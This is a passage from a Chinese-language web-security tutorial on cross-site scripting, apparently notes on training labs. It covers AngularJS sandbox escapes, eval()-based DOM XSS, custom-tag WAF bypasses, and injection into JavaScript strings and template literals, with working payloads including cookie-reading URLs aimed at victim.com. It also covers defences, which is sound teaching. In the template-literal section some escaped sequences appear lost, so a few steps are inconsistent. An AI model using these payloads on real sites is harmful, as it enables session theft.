3. `[].constructor.constructor` -- 返回 `Function` 构造函数（`Array.constructor === Function`）
4. `[].constructor.constructor('alert(1)')()` -- 创建并执行函数

同理，字符串也适用：

```
{{''.constructor.constructor('alert(1)')()}}
```

**其他可用的沙箱逃逸对象：**

| 对象 | Payload 示例 |
|------|-------------|
| `$on` | `{{$on.constructor('alert(1)')()}}` |
| `$watch` | `{{$watch.constructor('alert(1)')()}}` |
| `$apply` | `{{$apply.constructor('alert(1)')()}}` |
| 空数组 | `{{[].constructor.constructor('alert(1)')()}}` |
| 空字符串 | `{{''.constructor.constructor('alert(1)')()}}` |
| `toString` | `{{'a'.toString.constructor('alert(1)')()}}` |

#### 实战验证步骤

在 AngularJS 靶场中，建议按以下顺序进行测试：

**步骤 1：确认 AngularJS 表达式是否被求值**

```
/?search={{7*7}}
```

如果页面显示 `49`（而非字面量 `{{7*7}}`），说明 AngularJS 正在解析表达式。

**步骤 2：尝试直接调用（通常被沙箱拦截）**

```
/?search={{alert(1)}}
```

如果弹窗，说明沙箱不存在或已被移除。如果无反应，进入步骤 3。

**步骤 3：使用沙箱逃逸**

```
/?search={{$on.constructor('alert(1)')()}}
```

或：

```
/?search={{[].constructor.constructor('alert(1)')()}}
```

#### 防御方案

1. **升级 AngularJS：** 1.6+ 移除了沙箱并修复了部分逃逸漏洞，但表达式注入的威胁仍然存在，不能依赖版本升级作为唯一的防御
2. **避免将用户输入回显到 ng-app 作用域内：** 这是最根本的防御
3. **对用户输入过滤 `{{` 和 `}}`：** 例如 `str.replace(/{{|}}/g, '')`
4. **使用 `textContent` 替代 `innerHTML`：** 避免 AngularJS 编译用户可控内容
5. **使用 `ng-non-bindable` 指令：** 对不需要表达式解析的元素添加此属性，阻止 AngularJS 编译其中的内容

#### AngularJS 沙箱逃逸与常规 XSS 对比

| 维度 | 常规 DOM XSS (innerHTML) | AngularJS 表达式注入 |
|------|------------------------|-------------------|
| 需要的字符 | `<`, `>`, `"` 等 HTML 元字符 | `{`, `}`, `(`, `)` -- 不受 HTML 编码影响 |
| 是否依赖事件 | 是（onerror, onload 等） | 否 -- 表达式在 AngularJS 编译阶段直接执行 |
| `<script>` 标签 | 不执行（HTML5 规范） | 不需要 |
| 防御要点 | HTML 编码 `<` `>` `"` | 过滤 `{{` `}}` 或避免数据进入 ng-app 作用域 |

### DOM XSS 与反射型/存储型的组合

#### 反射型 DOM XSS

服务器处理请求中的数据，并将数据回显到响应中。反射的数据可能被放入 JavaScript 字符串字面量或 DOM 中的数据项（如表单字段）。页面上的脚本然后以不安全的方式处理反射的数据，最终将其写入危险的 sink。

**与纯反射型 XSS 的区别：** 纯反射型 XSS 中，服务器直接将恶意输入嵌入 HTML 响应，浏览器解析 HTML 时执行注入的脚本。而反射型 DOM XSS 中，服务器仅将数据反射到响应中（如 JSON），客户端 JavaScript 再以不安全的方式处理这些数据，最终触发漏洞。漏洞的执行点在客户端而非服务器端。

##### 靶场案例：Reflected DOM XSS via `eval()` with backslash escape bypass

**漏洞概述：** 此靶场展示了一个经典的反射型 DOM XSS。服务器将用户搜索词以 JSON 格式反射回响应中，客户端 JavaScript 使用 `eval()` 解析 JSON，但服务器对引号的转义存在缺陷（转义了 `"` 却未转义 `\`），导致攻击者可以突破 JSON 字符串边界执行任意 JavaScript。

**漏洞代码（`searchResults.js`）：**

```javascript
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();
}
```

**Source 与 Sink 分析：**

| 角色 | 内容 | 说明 |
|------|------|------|
| Source | `window.location.search` | URL 查询字符串，攻击者完全可控 |
| 服务器处理 | 将搜索词嵌入 JSON 响应；对 `"` 添加 `\` 转义，但**不对 `\` 本身转义** | 存在转义缺陷 |
| Sink | `eval()` | 将 JSON 字符串当作 JavaScript 代码直接执行 |
| 数据流 | URL -> 服务器反射 JSON -> `eval()` -> 任意代码执行 | 反射 + 客户端不安全处理 |

**Payload 构造：**

攻击者搜索词：`\"-alert(1)}//`

服务器返回的 JSON 响应变为：

```json
{"searchTerm":"\\"-alert(1)}//", "results":[]}
```

**Payload 执行过程分步拆解：**

| 步骤 | 原始输入 | 服务器处理 | 最终在 eval 中 | 效果 |
|------|---------|-----------|---------------|------|
| 1 | `\"` | 服务器在 `"` 前添加 `\` -> `\\"` | `\\"` | `\\` 被 JS 解析为字面量反斜杠，`"` 恢复为字符串终止符 |
| 2 | `-alert(1)` | 不变 | `-alert(1)` | 减法运算符触发 `alert(1)` 执行（副作用触发，返回 `undefined`） |
| 3 | `}//` | 不变 | `}//` | `}` 提前闭合 JSON 对象，`//` 注释掉剩余内容 |

**完整数据流追踪：**

```
用户输入: \"-alert(1)}//
    |
    v
服务器 JSON 响应: {"searchTerm":"\\"-alert(1)}//", "results":[]}
    |
    v
eval('var searchResultsObj = {"searchTerm":"\\"-alert(1)}//", "results":[]}')
    |
    v
JavaScript 解析:
  - '{"searchTerm":"'  -> JSON 对象的 searchTerm 属性开始
  - '\\'              -> 字面量反斜杠字符 (转义序列被消费)
  - '"'               -> 字符串终止符 (searchTerm 的值到此结束)
  - '-alert(1)'       -> 减法表达式，alert(1) 被执行 (副作用)
  - '}//'             -> 闭合 JSON 对象，注释剩余部分
    |
    v
alert(1) 弹窗 -- 攻击成功
```

**为什么使用了与"反斜杠转义绕过"相同的技术？**

此靶场的利用技术与前文 [反斜杠转义绕过](#脱离-javascript-字符串) 中描述的原理完全一致：服务器只转义了引号，却忽略了反斜杠本身。攻击者预先在 payload 中加入反斜杠，使其与服务器添加的反斜杠组成 `\\`，消耗掉转义功能，导致其后的引号恢复为字符串终止符。

唯一的环境差异是：前文的场景是 JavaScript 字符串字面量，而此处是 JSON 响应中的字符串值——但 JSON 本质上是 JavaScript 的子集，`eval()` 对 JSON 的解析遵循相同的转义规则。

> **注意：** 如果服务器使用 `addslashes()` 或正确的 JSON 序列化库，会同时转义 `\` 和 `"`，使此绕过技术失效。漏洞产生的根本原因是：使用了**不完整的转义逻辑**（只转义引号，不转义反斜杠），并使用 `eval()` 代替 `JSON.parse()` 来解析 JSON 响应。

#### 存储型 DOM XSS

服务器从一个请求接收数据，存储它，然后在后续响应中包含该数据。后续响应中的脚本包含一个 sink，以不安全的方式处理该数据：

```javascript
element.innerHTML = comment.author;
```

### 导致 DOM-XSS 漏洞的主要 Sinks

**JavaScript Sinks：**

| Sink | 说明 |
|------|------|
| `document.write()` | 向文档写入 HTML，可注入 script 标签 |
| `document.writeln()` | 同 write()，追加换行 |
| `element.innerHTML` | 设置元素的 HTML 内容，不接受 script 但接受事件处理器 |
| `element.outerHTML` | 替换整个元素，风险同 innerHTML |
| `element.insertAdjacentHTML` | 在指定位置插入 HTML |
| `element.onevent` | 直接赋值事件处理器（如 `element.onclick = userInput`） |
| `eval()` | 执行任意 JavaScript 字符串 |
| `setTimeout()` / `setInterval()` | 第一个参数为字符串时作为代码执行 |
| `new Function()` | 从字符串创建可执行函数 |
| `location.href` / `location.replace()` | 导航到 `javascript:` URL 时执行代码 |
| `document.cookie` | 在某些情况下可被用于 session fixation |

**jQuery Sinks：**

| Sink | 风险 |
|------|------|
| `$()` | 如果输入以 `<` 开头，可创建新的 DOM 元素 |
| `html()` / `append()` / `prepend()` | 设置 HTML 内容，类似 innerHTML |
| `after()` / `before()` | 在元素前后插入 HTML |
| `replaceAll()` / `replaceWith()` | 替换元素为 HTML |
| `wrap()` / `wrapInner()` / `wrapAll()` | 包裹元素 |
| `attr()` / `prop()` | 修改属性值，对 href/src 等属性危险 |
| `add()` / `has()` | 在某些条件下可被利用 |

---

## XSS 上下文

当测试反射型和存储型 XSS 时，关键任务是识别 XSS 上下文：
- 攻击者可控数据在响应中出现的位置
- 应用程序对该数据执行的任何输入验证或其他处理

基于这些细节，选择一个或多个候选 XSS payload 并测试其有效性。

### XSS 位于 HTML 标签之间

当 XSS 上下文为 HTML 标签之间的文本时，需要引入一些旨在触发 JavaScript 执行的新 HTML 标签。

常用方式：

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### 自定义标签绕过 WAF

##### 什么是自定义标签？

自定义标签是指不符合标准 HTML 规范、由开发者自行创建和命名的 HTML 标签。它们不在 W3C 的 HTML 标准中定义，但浏览器仍然会解析和渲染它们。

**基本示例：**

```html
<!-- 标准 HTML 标签 -->
<div>这是标准标签</div>
<p>这也是标准标签</p>

<!-- 自定义标签 -->
<my-custom-tag>这是自定义标签</my-custom-tag>
<hello-world>你好，世界！</hello-world>
<abc123>测试</abc123>
```

浏览器虽然不认识这些标签，但不会报错，只是将它们当作"未知元素"处理，默认以 `display: inline` 方式渲染。

##### 自定义标签的特点

| 特点 | 说明 |
|------|------|
| 不报错 | 浏览器不会因为遇到未知标签而停止解析 |
| 可加属性 | 可以像标准标签一样添加 `id`、`class` 等属性 |
| 可绑定事件 | 可以绑定 JavaScript 事件（如 `onclick`、`onmouseover` 等） |
| DOM 操作 | 可以通过 JavaScript 动态创建、查询和操作 |
| 默认样式 | 浏览器会给予默认的 `display: inline` 样式 |

##### 在 XSS 攻击中的应用

在 WAF 拦截了所有标准标签（如 `<script>`、`<img>`、`<body>` 等）的情况下，攻击者可以尝试使用自定义标签来绕过检测。

**为什么可能绕过 WAF？**

- WAF 通常维护一个"黑名单"，只拦截已知的危险标签（如 `<script>`、`<img>`、`<iframe>` 等）
- 自定义标签不在黑名单中，WAF 可能认为它是无害的而放行
- 事件属性（如 `onmouseover`）才是真正执行代码的，但 WAF 可能只检查标签名，忽略了事件属性

##### 给自定义标签绑定事件

**方式一：直接在标签内绑定（最常用）**

```html
<xss onfocus="alert(1)" tabindex="0">点击或聚焦我</xss>
```

关键点：直接使用 `onfocus` 属性绑定事件；必须添加 `tabindex` 属性，否则元素无法获得焦点；`tabindex="0"` 表示元素可以通过键盘 Tab 键获得焦点。

**方式二：通过 JavaScript 绑定**

```html
<xss id="myXss">点击或聚焦我</xss>

<script>
    // 使用 addEventListener
    document.getElementById('myXss').addEventListener('focus', function() {
        alert(1);
    });

    // 或使用 onfocus 属性
    // document.getElementById('myXss').onfocus = function() { alert(1); };
</script>
```

**方式三：结合 autofocus 属性自动触发**

```html
<xss onfocus="alert(1)" tabindex="0" autofocus>自动聚焦触发</xss>
```

`autofocus` 让页面加载时自动聚焦到该元素，配合 `onfocus` 事件，可实现无需用户交互自动执行。

**触发 onfocus 事件的方法汇总：**

| 触发方式 | 说明 | 是否需要用户交互 |
|---------|------|----------------|
| 用户点击元素 | 鼠标点击 | 是 |
| 用户按 Tab 键 | 键盘导航到元素 | 是 |
| `autofocus` 属性 | 页面加载自动聚焦 | 否 |
| `element.focus()` | JavaScript 手动聚焦 | 否 |

##### tabindex 与 id 的作用

以 payload `<xss id=x onfocus=alert(document.cookie) tabindex=1>` 为例，这两个属性各司其职：

**`id=x` 的作用：** 为元素设置唯一标识符，用于 JavaScript 引用和 DOM 操作。

| 用途 | 说明 |
|------|------|
| JavaScript 引用 | 可以通过 `document.getElementById('x')` 获取该元素 |
| DOM 操作 | 可以手动控制该元素，如调用 `focus()` 使其获得焦点 |
| URL 锚点 | URL 中的 `#x` 可以直接滚动到该元素位置 |

**`tabindex` 的作用：** 让自定义标签可以获得焦点。自定义标签默认不可聚焦（不像 `<input>`、`<a>` 等表单元素天生可聚焦），没有 `tabindex` 则 `onfocus` 事件永远不会触发。

| `tabindex` 值 | 含义 |
|---------------|------|
| `tabindex="0"` | 元素可聚焦，按 Tab 键顺序访问 |
| `tabindex="1"` | 元素可聚焦，Tab 顺序排在所有 `tabindex="0"` 之前 |
| `tabindex="-1"` | 元素可聚焦，但不能通过 Tab 键访问（只能通过 JavaScript `focus()`） |

**对比验证：**

```html
<!-- 没有 tabindex：无法聚焦，onfocus 永远不会触发 -->
<xss onfocus=alert(1)>无效</xss>

<!-- 有 tabindex：可以聚焦，onfocus 可以触发 -->
<xss onfocus=alert(1) tabindex=0>有效</xss>
```

**两者配合的完整攻击链：**

| 属性 | 主要作用 | 在 XSS 攻击中的价值 |
|------|---------|-------------------|
| `id=x` | 标识元素，供 JavaScript 引用 | 让攻击者可以通过 `getElementById('x')` 精确操控该元素 |
| `tabindex=1` | 让元素可聚焦 | 让 `onfocus` 事件可以被触发（没有它，`onfocus` 无效） |

##### 攻击 payload 构造与 URL 编码

**典型 payload：**

```
<xss id=x onfocus=alert(document.cookie) tabindex=1 autofocus>
```

**URL 编码后的 payload（用于通过 URL 参数投递）：**

```
%3Cxss%20id%3Dx%20onfocus%3Dalert(document.cookie)%20tabindex=1%20autofocus%3E
```

**编码对照表：**

| 编码 | 解码后 | 说明 |
|------|--------|------|
| `%3C` | `<` | 小于号，标签开始 |
| `%3E` | `>` | 大于号，标签结束 |
| `%3D` | `=` | 等号 |
| `%20` | 空格 | URL 中的空格编码 |
| `%28` | `(` | 左括号 |
| `%29` | `)` | 右括号 |

**完整攻击 URL 示例：**

```
https://victim.com/?search=%3Cxss%20id%3Dx%20onfocus%3Dalert(document.cookie)%20tabindex=1%20autofocus%3E
```

##### 通过 location 跳转投递 payload

`location` 是 JavaScript 中用于控制浏览器当前页面 URL 的对象，在 XSS 攻击中用于强制浏览器跳转到构造好的恶意 URL。

**基本用法：**

```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

**与其他跳转方式的对比：**

| 方式 | 代码示例 | 特点 |
|------|---------|------|
| `location` | `location = 'url'` | 最简洁，直接赋值 |
| `location.href` | `location.href = 'url'` | 与 `location` 等价，更明确 |
| `location.assign()` | `location.assign('url')` | 标准方法，会留下历史记录 |
| `location.replace()` | `location.replace('url')` | 不会留下历史记录（无法后退） |
| `window.open()` | `window.open('url')` | 在新窗口/标签页打开 |

**`location` 在攻击中的核心价值：**

| 作用 | 说明 |
|------|------|
| 自动化 | 无需用户点击链接，脚本自动跳转 |
| 精确投递 | 可以将攻击参数精确地放入 URL 中 |
| 绕过限制 | 某些场景下，通过 `location` 跳转可以绕过 `<a>` 标签的限制 |

**三种常见使用场景：**

```html
<!-- 场景1：攻击者自己的页面中使用 -->
<script>
location = 'https://victim.com/?search=<xss onfocus=alert(1) tabindex=0 autofocus>';
</script>

<!-- 场景2：通过注入点注入 -->
<script>
location = 'https://victim.com/?search=<xss onfocus=alert(1) tabindex=0 autofocus>';
</script>

<!-- 场景3：结合 onload 事件 -->
<body onload="location='https://victim.com/?search=...'">
```

**关于 URL 锚点 `#x` 的说明：** URL 中的 `#x` 只会让浏览器**滚动**到 `id="x"` 的元素位置，**不会**自动触发 `onfocus` 事件。要让 `onfocus` 自动触发，必须使用 `autofocus` 属性或通过 JavaScript 调用 `focus()` 方法。

**完整攻击流程：**

```
1. location 跳转到漏洞页面（携带注入 payload）
   ->
2. 页面反射搜索参数，浏览器解析出自定义标签 <xss>
   ->
3. autofocus 让元素自动获得焦点（或通过 JS 调用 focus()）
   ->
4. tabindex 使元素可聚焦，onfocus 事件触发
   ->
5. alert(document.cookie) 被执行，Cookie 泄露
```

##### 自定义标签与标准标签的对比

| 对比项 | 标准标签 | 自定义标签 |
|--------|---------|-----------|
| 示例 | `<div>`, `<body>`, `<img>` | `<my-tag>`, `<abc>` |
| 浏览器识别 | 是 | 否 |
| 预定义样式/行为 | 有 | 无（继承默认） |
| WAF 拦截概率 | 高（危险标签被重点监控） | 低（不在黑名单中） |
| 兼容性 | 所有浏览器 | 现代浏览器支持，旧浏览器可能有问题 |
| 事件绑定 | 支持 | 支持 |
| 可访问性 | 好 | 差（屏幕阅读器无法理解） |

##### Web Components 中的自定义标签

在现代 Web 开发中，自定义标签是 Web Components 标准的一部分，被称为"自定义元素"（Custom Elements）。

```javascript
// 注册一个自定义标签
class MyButton extends HTMLElement {
    constructor() {
        super();
        this.innerHTML = `<button>点击我</button>`;
    }
}
customElements.define('my-button', MyButton);
```

```html
<!-- 使用自定义标签 -->
<my-button></my-button>
```

这种情况下，自定义标签是有明确定义和功能的，不是攻击手段。

##### 防御方法

- **不要依赖黑名单：** 使用白名单机制，只允许已知安全的标签
- **对用户输入进行严格过滤：** 使用成熟的 HTML 净化库（如 DOMPurify）
- **内容安全策略（CSP）：** 限制可执行的脚本来源
- **输出编码：** 将 `<` 和 `>` 编码为 `&lt;` 和 `&gt;`

```javascript
// 使用 DOMPurify 净化用户输入
const clean = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['b', 'i', 'p', 'div'], // 只允许这些标签
    ALLOWED_ATTR: ['class', 'id']          // 只允许这些属性
});
```

**一句话总结：** 自定义标签是开发者自创的、不在 HTML 标准中的标签。在 XSS 攻击中，如果 WAF 只拦截标准危险标签，攻击者可能利用自定义标签配合事件属性（如 `onmouseover`）来绕过防御执行恶意代码。

### XSS 位于 HTML 标签属性中

当 XSS 上下文在 HTML 标签属性值中时：

**方法一：终止属性值、闭合标签并引入新标签：**

```html
"><script>alert(document.domain)</script>
```

**方法二：在尖括号被阻止或编码的情况下，终止属性值并引入新的事件处理器属性：**

```html
" autofocus onfocus=alert(document.domain) x="
```

此 payload 创建 `onfocus` 事件，当元素获得焦点时执行 JavaScript，同时添加 `autofocus` 属性自动触发 `onfocus` 事件，最后添加 `x="` 修复后续标记。

**方法三：利用属性本身的脚本上下文（如 href 属性中的 javascript 伪协议）：**

```html
<a href="javascript:alert(document.domain)">
```

**方法四：利用 accesskey 属性 + 用户交互：**

即使在通常不会自动触发事件的标签（如 canonical 标签）中注入属性，也可以利用 access key 和 Chrome 上的用户交互来利用此行为。`accesskey` 属性允许定义键盘快捷键，当与其他键组合按下时将触发事件。

### XSS 进入 JavaScript

当 XSS 上下文在响应中已有的 JavaScript 中时，存在多种场景：

#### 终止现有脚本

最简单的情况是闭合包含现有 JavaScript 的 script 标签，并引入触发 JavaScript 执行的新 HTML 标签：

```html
<script>
...
var input = 'controllable data here';
...
</script>
```

Payload：

```html
</script><img src=1 onerror=alert(document.domain)>
```

**原理：** 浏览器首先执行 HTML 解析以识别页面元素（包括 script 块），然后才执行 JavaScript 解析以理解和执行嵌入的脚本。上述 payload 使原始脚本保持破坏状态（含有未终止的字符串字面量），但这不妨碍后续脚本以正常方式解析和执行。

#### 脱离 JavaScript 字符串

当 XSS 上下文位于带引号的字符串字面量中时，通常可以脱离字符串并直接执行 JavaScript。必须修复 XSS 上下文之后的脚本，因为其中的任何语法错误将阻止整个脚本执行。

**场景：** 应用程序将用户输入直接嵌入到 JavaScript 字符串变量中：

```javascript
var user = "{{ 用户输入 }}";  // 用户输入被包在引号内，成为字符串内容
```

攻击者的目标是闭合字符串的引号，使后续内容成为独立的 JavaScript 语句。

**脱离字符串字面量的常用方式：**

```javascript
'-alert(document.domain)-'
';alert(document.domain)//
```

**工作原理解析（以 `';alert(document.domain)//` 为例）：**

1. **闭合引号：** payload 的第一个 `'` 闭合了原始字符串，使字符串在赋值语句处终止
2. **结束语句：** 分号 `;` 结束 `var user = '';` 这条赋值语句
3. **执行代码：** `alert(document.domain)` 成为独立的 JavaScript 语句被执行
4. **注释残余：** `//` 将原始代码中剩余的引号和语句注释掉，避免产生语法错误

最终页面代码变为：

```javascript
var user = '';alert(document.domain)//原始字符串的剩余部分';
```

`//` 之后的所有内容（包括原本属于字符串的 `'`）都被视为注释，不会引发语法错误。如果不加 `//`，剩余的 `';` 等碎片会导致脚本解析失败，整个 `<script>` 块可能无法执行。

**替代技术 —— 利用运算符执行函数（`'-alert(document.domain)-'`）：**

`'-alert(document.domain)-'` 这个 payload 看起来只是三个被 `-` 连接的字符串片段，但实际上利用的是 JavaScript 运算符的强制类型转换来触发函数执行。

以同样的漏洞场景为例：

```javascript
var user = '{{ 用户输入 }}';
```

攻击者输入 `'-alert(document.domain)-'`，最终页面变为：

```javascript
var user = ''-alert(document.domain)-'';
```

JavaScript 执行过程：

1. `''`（空字符串）出现在减法运算符 `-` 的左侧 —— JavaScript 将其**强制转换为数字**：`Number('')` 结果为 `0`
2. `alert(document.domain)` 作为减法运算的中间操作数**被调用执行** —— 弹窗显示域名，返回值是 `undefined`
3. `undefined` 被减法运算符强制转换为数字 —— `Number(undefined)` 结果为 `NaN`
4. 最右边的 `''` 同样转换为数字 `0`
5. 算术表达式求值：`0 - NaN - 0` = `NaN`
6. 最终 `var user = NaN;` —— 但这已经不重要了，**`alert()` 的副作用已经在第 2 步触发**

**关键洞察：**

- **不需要分号 `;`**：整个表达式 `''-alert()-''` 在语法上是合法的 JavaScript，由减法运算符连接三个操作数
- **不需要注释 `//`**：原始代码中剩余的 `''` 被减法表达式"自然消耗"掉，没有残留碎片需要处理
- **函数调用先于运算**：JavaScript 必须先执行 `alert()` 获取其返回值，才能继续进行减法运算 —— 副作用（弹窗）在表达式求值过程中必然触发

**与 `';alert()//` 方式的对比：**

| 特性 | `';alert()//` | `'-alert()-'` |
|------|--------------|---------------|
| 闭合手段 | 用 `'` 终结字符串后写新语句 | 不终结字符串，用运算符将后续字符纳入表达式 |
| 语句分离 | 用 `;` 分号开始新语句 | 用 `-` 减法运算符连接操作数（表达式内部） |
| 残余处理 | 用 `//` 注释掉剩余代码 | 自然消耗 —— 表达式语法完整，无需额外处理 |
| 变量结果 | 赋值为空字符串 `''` | 赋值为 `NaN` |
| 适用场景 | 通用首选 | 当 `;` 或 `//` 被过滤时作为替代方案 |

---

**反斜杠转义绕过：**

某些应用程序尝试防御此类攻击，在用户输入中的每个引号前添加反斜杠 `\` 进行转义。在 JavaScript 字符串中，`\'` 表示一个字面量引号字符，而非字符串终止符，因此攻击者无法通过简单引号闭合字符串。

然而，漏洞在于：**应用程序转义了引号，却忘记转义反斜杠字符本身。** 攻击者利用这一点，预先在自己的 payload 中添加反斜杠，使其与服务器注入的反斜杠相互作用。

**攻击过程分步拆解：**

**第一步（防御生效）—— 正常 payload 被阻止：**

```
用户输入：  ';alert(document.domain)//
服务器处理： \';alert(document.domain)//     （服务器在 ' 前添加 \）
最终代码：  var user = '\';alert(document.domain)//剩余部分';
```

JavaScript 引擎解析：
- `'` 开启字符串字面量
- `\'` 是转义序列，表示一个字面量单引号字符（不作为字符串终止符）
- `;alert(document.domain)//剩余部分` 仍在字符串内部，作为普通文本处理
- 攻击失败 —— `alert()` 不会执行

**第二步（绕过防御）—— 带反斜杠的 payload 成功：**

```
用户输入：  \';alert(document.domain)//
服务器处理： \\';alert(document.domain)//     （服务器仍在 ' 前添加 \）
最终代码：  var user = '\\';alert(document.domain)//剩余部分';
```

JavaScript 引擎解析：
- `'` 开启字符串字面量
- `\\` 是转义序列，表示一个字面量反斜杠字符 `\`。两个反斜杠作为一个完整的转义序列被"消费"掉
- 紧随其后的 `'` **不再被转义**（因为其前面的 `\` 已被 `\\` 消耗），成为字符串终止符，字符串在此结束
- `;alert(document.domain);` 成为独立的代码语句 —— **攻击成功**
- `//剩余部分'` 被单行注释忽略

**核心原理：** 攻击者提供的反斜杠与服务器添加的反斜杠相遇，形成 `\\`。JavaScript 将 `\\` 解析为一个字面量反斜杠字符。服务器添加的反斜杠被"消耗"，导致其后的引号失去转义保护，恢复为字符串终止符的功能。

**JavaScript 转义规则速查：**

| 转义序列 | 含义 | 说明 |
|---------|------|------|
| `\'` | 字面量单引号 | 不终结由 `'` 开启的字符串 |
| `\"` | 字面量双引号 | 不终结由 `"` 开启的字符串 |
| `\\` | 字面量反斜杠 | 两个反斜杠 → 一个真正的反斜杠字符 |

**总结对比：**

| 场景 | 用户输入 | 服务器输出 | JavaScript 解析 | 结果 |
|------|---------|-----------|----------------|------|
| 无防御 | `';alert(1)//` | `';alert(1)//` | `'` 终结字符串，`alert(1)` 执行 | 成功 |
| 转义引号 | `';alert(1)//` | `\';alert(1)//` | `\'` 是字面量引号，字符串不终结 | 失败 |
| 绕过转义 | `\';alert(1)//` | `\\';alert(1)//` | `\\` 消耗反斜杠，`'` 恢复为终结符 | 成功 |

**注意 —— 关于 `addslashes()`：** PHP 的 `addslashes()` 函数会同时转义 `'` 和 `\`（以及 `"` 和 NUL 字节）。如果应用程序使用 `addslashes()`，攻击者输入中的 `\` 也会被转义为 `\\`，使得此绕过技术失效。本绕过仅适用于**只转义引号、不转义反斜杠**的防御实现。现实中这类实现通常出现在手动编写的过滤代码中（例如用 `str_replace("'", "\'", $input)` 而非 `addslashes()`）。

**无括号函数调用技术：** 某些网站通过限制可用字符使 XSS 更加困难。可以使用 `throw` 语句配合异常处理器，在不使用括号的情况下向函数传递参数：

```javascript
onerror=alert;throw 1
```

此代码将 `alert()` 函数赋值给全局异常处理器，`throw` 语句将 `1` 传递给异常处理器（即 `alert`）。最终结果是 `alert()` 函数以 `1` 作为参数被调用。

### 利用 HTML 编码绕过输入过滤

当 XSS 上下文在带引号的标签属性中的某个现有 JavaScript 内（如事件处理器）时，可以利用 HTML 编码来绕过某些输入过滤器。

当浏览器解析出响应中的 HTML 标签和属性后，会在进一步处理之前对标签属性值执行 HTML 解码。如果服务器端应用程序阻止或清理了成功 XSS 攻击所需的某些字符，通常可以通过对这些字符进行 HTML 编码来绕过输入验证。

例如，如果 XSS 上下文为：

```html
<a href="#" onclick="... var input='controllable data here'; ...">
```

且应用程序阻止或转义了单引号字符，可以使用以下 payload：

```
&apos;-alert(document.domain)-&apos;
```

`&apos;` 序列是表示撇号或单引号的 HTML 实体。由于浏览器在解释 JavaScript 之前对 `onclick` 属性的值进行 HTML 解码，实体被解码为引号，成为字符串分隔符，攻击成功。

### XSS 进入 JavaScript 模板字面量

JavaScript 模板字面量（Template Literals）是允许嵌入 JavaScript 表达式的字符串字面量。模板字面量用反引号而非普通引号包裹，嵌入表达式使用 `${...}` 语法标识。

```javascript
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

当 XSS 上下文在 JavaScript 模板字面量中时，无需终止字面量本身。只需使用 `${...}` 语法嵌入一个 JavaScript 表达式，该表达式将在字面量被处理时执行：

```javascript
${alert(document.domain)}
```

#### 案例：Unicode 转义绕过 —— 模板字面量注入

**Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**

##### 漏洞概述

此 Lab 的搜索功能将用户输入反射到 JavaScript 模板字面量内部。服务器对以下字符做了 Unicode 转义防御：

| 字符 | 编码方式 | 编码结果 |
|------|---------|---------|
| `<` `>` | HTML 编码 | `&lt;` `&gt;` |
| `'` `"` | HTML 编码 | `&quot;` `&#x27;` |
| `\` | Unicode 转义 | `\\u005c` |
| `` ` `` | Unicode 转义 | `\\u0060` |
| `$` | Unicode 转义 | `\\u0024` |

看起来防御很全面，但 `${` 组合仍然可以触发模板插值。Payload：`${alert(1)}`

##### 核心原理

浏览器先解析 HTML/JavaScript 语法结构，再执行编码转换。服务器把字符转义了，但 `$` 和 `{` 组合成的 `${` 是一个"语法标记"，Unicode 转义在语法解析阶段之后被还原，所以插值代码被执行。

**关键洞察：** 服务器试图通过"字符转义"来防御"语法结构"，但浏览器在解析时先还原了转义字符，再识别语法结构，导致防御被绕过。

##### 服务端代码还原

假设后端代码（简化）如下：

```javascript
// 用户输入：${alert(1)}
let userInput = 转义函数(用户输入);  // 转义后变成：${alert(1)}
let html = `
    <script>
        var searchQuery = `用户输入`;  // 实际输出：var searchQuery = `${alert(1)}`;
    </script>
`;
```

服务器输出的最终 HTML：

```html
<script>
    var searchQuery = `${alert(1)}`;
</script>
```

##### 浏览器解析过程（两阶段）

**阶段一：JavaScript 引擎解析 Unicode 转义。** `$` 被还原为字符 `$`，代码变为：

```javascript
var searchQuery = `${alert(1)}`;
```

**阶段二：JavaScript 引擎解析模板字面量语法。** 识别到 `${}` 插值表达式，执行 `alert(1)`。

**为什么其他字符被转义不影响？**

- `<>` 被 HTML 编码 -- 但在 `<script>` 标签内，HTML 编码不会被还原，所以不起作用
- `'` `"` 被 HTML 编码 -- 同上，在 JS 上下文中不会被还原
- `` ` `` 被 Unicode 转义为 ``` -- 这会阻止模板字面量的开始/结束，但攻击利用的是 `${}`，不需要反引号
- 最致命的是：服务器转义了单独的 `$`，但没有意识到 `$` 和 `{` 的组合才是关键

##### 数据流追踪

```
用户输入: ${alert(1)}
    |
    v
服务器转义: ${alert(1)}
    |
    v
浏览器收到: var searchQuery = `${alert(1)}`;
    |
    v
JS 引擎步骤1 (Unicode 还原): var searchQuery = `${alert(1)}`;
    |
    v
JS 引擎步骤2 (模板语法解析): 识别 ${}，执行 alert(1)
```

##### 技术术语总结

| 概念 | 解释 |
|------|------|
| 模板字面量 | ES6 引入，用反引号包裹，支持 `${}` 插值 |
| Unicode 转义 | `$` 是 `$` 的 Unicode 表示，JS 引擎会还原 |
| 语法解析 vs 值解析 | 语法解析先于值解析，Unicode 转义在值解析阶段被还原 |
| 二次解码 | 服务器编码一次，浏览器解码一次，导致防御失效 |

##### 防御教训

此漏洞的本质是：**转义发生在"字符串值"层面，而不是"语法结构"层面。** 要正确防御，需要理解浏览器解析的完整流程，不能依赖对单个字符的转义来阻止语法结构的形成。

### XSS 通过客户端模板注入

某些网站使用客户端模板框架（如 AngularJS）动态渲染网页。如果它们以不安全的方式将用户输入嵌入这些模板中，攻击者可能能够注入其自己的恶意模板表达式，发起 XSS 攻击。

---

## 利用 XSS 漏洞

### 利用 XSS 窃取 Cookie

窃取 Cookie 是传统的 XSS 利用方式。大多数 Web 应用程序使用 Cookie 进行会话处理。可以利用 XSS 漏洞将受害者的 Cookie 发送到攻击者自己的域，然后手动将 Cookie 注入浏览器并冒充受害者。

**实践中的限制：**

| 限制 | 说明 |
|------|------|
